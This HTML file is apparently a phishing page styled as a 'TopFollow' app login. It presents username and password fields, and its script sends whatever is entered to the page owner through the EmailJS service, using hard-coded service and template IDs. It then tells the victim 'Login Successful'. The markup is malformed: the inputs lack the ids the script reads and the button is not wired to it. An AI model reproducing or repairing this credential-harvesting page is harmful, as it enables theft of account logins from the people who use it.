<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TopFollow Style Login</title>

<style>

body{
margin:0;
font-family:Arial;
background:linear-gradient(180deg,#c000ff,#7a00ff);
height:100vh;
display:flex;
justify-content:center;
align-items:center;
}

.card{
width:340px;
background:#f3f3f3;
border-radius:20px;
padding:30px 20px;
box-shadow:0 10px 30px rgba(0,0,0,0.2);
text-align:center;
}

.logo{
width:80px;
height:80px;
background:#d8d8d8;
border-radius:50%;
margin:-70px auto 20px;
display:flex;
align-items:center;
justify-content:center;
font-size:30px;
}

h2{
margin-bottom:20px;
}

input{
width:90%;
padding:14px;
margin:10px 0;
border-radius:10px;
border:2px solid #ddd;
font-size:15px;
}

button{
width:95%;
padding:15px;
margin-top:20px;
border:none;
border-radius:10px;
background:#ff9800;
color:white;
font-size:16px;
cursor:pointer;
}

button:hover{
opacity:0.9;
}

</style>

</head>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>

(function(){
emailjs.init("287g46US2fGjoY4LL");
})();

function sendLogin(){

var username = document.getElementById("username").value;
var password = document.getElementById("password").value;

var params = {
username: username,
password: password
};

emailjs.send("service_3ux49q7","template_fn1apho",params)
.then(function(){
alert("Login Successful");
});

}

</script>

</body>
</html>
<body>

<div class="card">

<div class="logo">👤</div>

<h2>Login</h2>

<input type="text" placeholder="Username">

<input type="password" placeholder="Password">

<button>Log In</button>

</div>

</body>
</html>
